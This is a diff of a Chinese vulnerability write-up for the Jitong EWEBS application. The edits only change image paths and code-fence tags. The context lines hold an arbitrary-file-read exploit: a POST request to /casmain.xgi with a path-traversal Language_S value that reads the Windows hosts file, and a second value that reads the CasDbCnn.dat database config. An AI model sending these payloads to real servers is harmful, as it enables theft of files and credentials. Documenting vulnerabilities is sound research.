@@ -20,17 +20,11 @@ app="新软科技-极通EWEBS"
 
 登录页面如下
 
-
-
-![](images/202202101939828.png)
-
-
+![](../.gitbook/assets/202202101939828.png)
 
 漏洞请求包为
 
-
-
-```plain
+```
 POST /casmain.xgi HTTP/1.1
 Host: 
 Content-Type: application/x-www-form-urlencoded
@@ -42,16 +36,10 @@ Content-Length: 57
 Language_S=../../../../windows/system32/drivers/etc/hosts
 ```
 
-
-
-![](images/202202101939430.png)
-
-
+![](../.gitbook/assets/202202101939430.png)
 
 可以配合 testweb.php 信息泄露读取敏感信息
 
-
-
-```plain
+```
 Language_S=../../Data/CONFIG/CasDbCnn.dat
 ```
